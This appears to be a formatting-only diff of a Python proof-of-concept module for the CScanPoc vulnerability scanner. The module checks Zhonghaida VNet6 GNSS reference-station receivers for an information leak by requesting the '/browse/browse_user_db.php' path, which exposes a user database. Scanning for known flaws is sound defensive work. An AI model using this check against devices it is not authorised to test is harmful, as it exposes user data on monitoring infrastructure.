@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Zhonghaida_0006' # 平台漏洞编号，留空
+    vuln_id = 'Zhonghaida_0006'  # 平台漏洞编号，留空
     name = '中海达设备 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-08-26'  # 漏洞公布时间
     desc = '''
         该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '中海达VNet6专业型参考站接收机'  # 漏洞应用名称
     product_version = '中海达VNet6专业型参考站接收机'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8ef3a0f3-c0da-4422-a71e-3c75b56a4391'
@@ -32,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #https://wooyun.shuimugan.com/bug/view?bug_no=136374
+
+            # https://wooyun.shuimugan.com/bug/view?bug_no=136374
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/browse/browse_user_db.php'
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
